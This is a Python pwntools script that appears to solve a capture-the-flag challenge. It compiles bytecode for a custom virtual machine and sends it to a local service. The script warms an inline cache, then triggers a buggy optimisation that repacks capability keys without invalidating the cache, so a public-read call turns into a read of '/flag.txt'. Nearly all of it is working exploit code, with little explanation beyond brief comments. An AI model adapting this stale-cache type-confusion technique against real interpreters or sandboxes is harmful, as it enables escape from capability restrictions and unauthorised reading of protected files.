#!/usr/bin/env python3
from pwn import *
import struct

HOST = '127.0.0.1'
PORT = 5000
context.log_level = 'info'

def compile():
    LDG, KCONST, GETOWN, GETMETH = 0x02, 0x01, 0x20, 0x21
    CALL, RET, ADD, JMP, JNZ, OPTIMIZE = 0x30, 0x31, 0x40, 0x60, 0x61, 0x70
    KEY_IO, KEY_READ_PUBLIC = 3, 10
    def i16(n):
        return struct.pack('<h', n)
    prog = bytes([0x08, 0x03])
    prog += bytes([0x02, 0x04, 0x00]) + b"caps"           # c0: "caps"
    prog += bytes([0x01]) + struct.pack('<d', 1.0)        # c1: 1.0 (IEEE 754)
    prog += bytes([0x02, 0x09, 0x00]) + b"/flag.txt"      # c2: "/flag.txt"
    code = b""
    code += bytes([LDG, 0x00, 0x00])                      #  0: r0 = caps
    code += bytes([GETOWN, 0x01, 0x00, KEY_IO])           #  3: r1 = caps.io
    code += bytes([KCONST, 0x06, 0x01])                   #  7: r6 = 1.0
    code += bytes([KCONST, 0x07, 0x02])                   # 10: r7 = "/flag.txt"
    code += bytes([GETMETH, 0x02, 0x03, 0x01, KEY_READ_PUBLIC])  # 13: IC site
    code += bytes([JNZ, 0x05]) + i16(10)                  # 18: if r5 goto 32
    code += bytes([OPTIMIZE, 0x01, KEY_READ_PUBLIC])      # 22: vuln: repack by ascending keyId without bump
    code += bytes([ADD, 0x05, 0x06, 0x06])                # 25: r5 = 2 (truthy)
    code += bytes([JMP]) + i16(-19)                       # 29: goto 13
    code += bytes([CALL, 0x04, 0x02, 0x03, 0x01, 0x07])   # 32: r4 = fn("/flag.txt")
    code += bytes([RET, 0x04])                            # 38: return r4

    return prog + code


def solve(host, port):
    payload = compile()
    log.info(f"Payload ({len(payload)} bytes): {payload.hex()}")
    io = remote(host, port)
    io.sendline(payload.hex().encode())
    flag = io.recvline().decode().strip()
    log.success(f"Flag: {flag}")
    io.close()
    return flag

if __name__ == '__main__':
    solve(HOST, PORT)